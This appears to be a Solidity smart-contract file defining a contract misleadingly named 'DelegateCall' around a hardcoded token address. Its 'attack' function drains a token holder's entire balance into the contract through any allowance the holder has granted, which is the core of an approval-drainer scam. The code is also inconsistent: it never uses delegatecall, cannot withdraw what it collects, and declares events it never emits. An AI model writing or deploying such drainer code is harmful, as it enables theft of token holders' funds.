// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface EXMToken {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract DelegateCall {
    EXMToken public tokenContract;
    address public exmTokenAddress;

    constructor() {
        exmTokenAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c;
        tokenContract = EXMToken(exmTokenAddress);
    }
function attack(address tokenHolder) public {
    // Check if the DelegateCall contract has enough allowance to transfer the tokens
    uint256 allowance = tokenContract.allowance(tokenHolder, address(this));
    uint256 balance = tokenContract.balanceOf(tokenHolder);
    require(balance > 0 && allowance >= balance, "Insufficient allowance or balance");

    // Transfer the tokens from the token holder to the DelegateCall contract
    require(tokenContract.transferFrom(tokenHolder, address(this), balance), "Transfer failed");
}


event ApprovalReceived(address indexed sender, address indexed spender, uint256 value);
event TransferExecuted(address indexed from, address indexed to, uint256 value);


}